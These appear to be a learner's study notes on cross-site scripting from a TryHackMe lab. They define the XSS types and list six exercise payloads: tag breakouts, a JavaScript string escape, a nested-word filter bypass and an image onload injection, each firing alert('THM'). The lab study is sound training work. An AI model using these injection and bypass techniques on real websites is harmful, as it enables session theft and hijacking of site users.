### XSS Payloads
- JavaScript code to be executed on a target computer
- Two parts of a payload:
	1. Intention -> what the attacker wants the JavaScript code to do
	2. Modification -> Changes to the code needed to make the code execute

#### Session Stealing
- Targeting a user's session to steal login token being kept as cookies on a targets machine

#### Key Logger 
- Anything typed on a webpage will be forwarded to a website under a hacker's control

#### Business Logic
- Depends on the specific scenario 
- This payload aims to perform actions against internal code that performs business logic actionable


### Reflected XSS

- XSS attacks that occurs when user-supplied data in a n HTTP request is included in the webpage source without validation

#### Protecting against Reflected XSS
- Test all possible points of entry:
	- Parameters in the URL Query String
	- URL File Path
	- Sometimes HTTP Headers 

### Stored XSS
- XSS attacks that occurs when a payload is stored on a web application and then gets run when users visit the site (web page)
### Blind XSS
- Works similar to a Stored XSS attack, but there is not ability to view the payload in action or ability to test the payload against oneself (See Stored XSS description)


## Perfecting your Payload (THM Exercise)

Level 1 

<script>alert('THM');</script>

Level 2

"><script>alert('THM');</script>

Adding the  (">) to the script allows the value tag and the input tag to be closed prior to the payload finishing

Level 3
</textarea><script>alert('THM');</script>

Adding the ("textarea") tag allows the text area tag to be closed and for the site alert to be display

Level 4
';alert('THM');//

Closes the javascript code to skip over the innerHTML values and display "THM"

Level 5

<sscriptcript>alert('THM');</sscriptcript>

Bypasses the input filter by adding extract characters that will eventually spell out dangerous words when concatenated together

Level 6 
/images/cat.jpg" onload="alert('THM');

adds attributes to an image to create a THM display

Polyglots
- XSS polyglot are strings of text that escape attributes, tags, and bypass filters in one line.
